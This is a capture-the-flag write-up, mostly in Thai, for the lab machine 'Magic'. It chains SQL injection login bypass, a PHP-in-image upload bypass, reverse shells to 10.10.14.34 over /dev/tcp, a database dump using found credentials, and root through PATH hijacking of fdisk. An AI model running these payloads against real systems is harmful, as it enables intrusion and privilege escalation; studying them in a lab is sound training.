# Recon

## TCP Scan
```bash
./scan.sh 10.10.10.185
[*] Running rustscan...
[*] Running nmap on ports: 22,80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 20:20 +07
Nmap scan report for 10.10.10.185 (10.10.10.185)
Host is up (0.032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds

```

ทดสอบใส่ SQLi ไปที่หน้า Login ปรากฎว่าสามารถ Bypass ได้ไปที่หน้า upload.php 

```sql
' or 1=1-- -
```


![[Challenge/HTB Challenge/Magic/IMG/001.png]]

upload.php
![[Challenge/HTB Challenge/Magic/IMG/002.png]]


## Bypass upload 

จากการทดสอบเราจะไม่สามารถ upload ไฟล์ php shell ไปได้ตรงๆ โดยระบบจะมีการ Filter ไฟล์ที่ Upload เข้าไป โดยจะอนุญาตเฉพาะ jpg, png เท่านั้น 

ทั้งนี้ เราสามารถใช้ cat.php.jpg ไปได้ โดยทำการเพิ่ม payload ของ php แทรกไประหว่างไฟล์

![[Challenge/HTB Challenge/Magic/IMG/003.png]]

ทั้งนี้ จากการตรวจสอบหน้า index.php เราจะเห็นว่าระบบจะมีการเก็บไฟล์ไว้ที่ /images/uploads/ชื่อไฟล์ ทำให้เราสามารถทราบได้ว่าปลายทางที่เก็บอยู่ที่ใด 
![[Challenge/HTB Challenge/Magic/IMG/004.png]]

## Shell as www-data

จากนั้นทดสอบโจมตีด้วย Reverse shell ก็จะสามารถเข้าถึงเป้าหมายได้ 
```http
http://10.10.10.185/images/uploads/cat2.php.jpg?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.34/443%200%3E%261%27
```

![[Challenge/HTB Challenge/Magic/IMG/005.png]]

## Enum host 

เนื่องจากว่าเป้าหมายเป้นเว็บไซต์จึงเข้าไปตรวจสอบบนไฟล์ /var/www/Magic จะพบ config ไฟล์ของ db.php5 ทำให้เป็นข้อมูลของชื่อผู้ใช้งานและรหัสผ่าน สำหรับเข้าใช้งาน mysql 

![[Challenge/HTB Challenge/Magic/IMG/006.png]]

```bash
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
```

![[Challenge/HTB Challenge/Magic/IMG/007.png]]

## Shell as theseus 
จะพบรหัสผ่านของ admin ซึ่งหากเราลอง su จะสามารถเข้าใช้งานได้ 

```bash
su theseus
Password: Th3s3usW4sK1ng

theseus@magic:/var/www/Magic$ whoami 
whoami 
theseus
theseus@magic:/var/www/Magic$ 
```


## Become ROOT

```bash
find / -user root -type f -perm -4000 -ls 2>/dev/null
```


จะพบว่ามีบรรทัดหนึ่งที่น่าสนใจโดยมีสิทธิของกลุ่ม users และมี owner เป็น root 
```bash
   393232     24 -rwsr-x---   1 root     users              22040 Oct 21  2019 /bin/sysinfo
```

จากนั้นให้ทำการวิเคราะห์ binary  ดังกล่าวด้วยการรัน sysinfo จากนั้นตรวจสอบด้วยคำสั่ง ltrace เพื่อที่จะตรวจสอบว่า Binary ดังกล่าวมีการเรียกใช้อะไรจากภายนอกบ้าง 

```bash
sysinfo

ltrace sysinfo
```

จากการรันเราจะพบว่าโปรแกรม sysinfo มีการเรียกใช้งาน fdisk ด้วยซึ่งคาดว่าจะมีการรันด้วยสิทธิ ROOT  

![[Challenge/HTB Challenge/Magic/IMG/008.png]]

โดยคำสั่ง popen เป็นการเปิดใช้งาน Process บน Linux ซึ่งจากบรรทัดดังกล่าวเป็นการเรียกใช้ fidisk ซึ่งหากไม่มีการระบุ full path นั่นหมายความว่าเราก็สามารถ Hijack Binary ได้เช่นกัน 

จากนั้นทำการแทรก binary ของ fdisk ด้วย Reverse shell ดังต่อไปนี้ 
```bash
theseus@magic:~$ cd /dev/shm
cd /dev/shm

theseus@magic:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.34/443 0>&1' 

</bash\n\nbash -i >& /dev/tcp/10.10.14.34/443 0>&1' 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.34/443 0>&1

theseus@magic:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.34/444 0>&1'  > fdisk


<nbash -i >& /dev/tcp/10.10.14.34/444 0>&1'  > fdisk


theseus@magic:/dev/shm$ chmod +x fdisk


chmod +x fdisk

theseus@magic:/dev/shm$ export PATH="/dev/shm:$PATH"

export PATH="/dev/shm:$PATH"

theseus@magic:/dev/shm$ sysinfo

```

และฝั่งผู้โจมตีการรอรับ  reverse shell ก็จะได้สิทธ้ root 

![[Challenge/HTB Challenge/Magic/IMG/009.png]]


# PWNED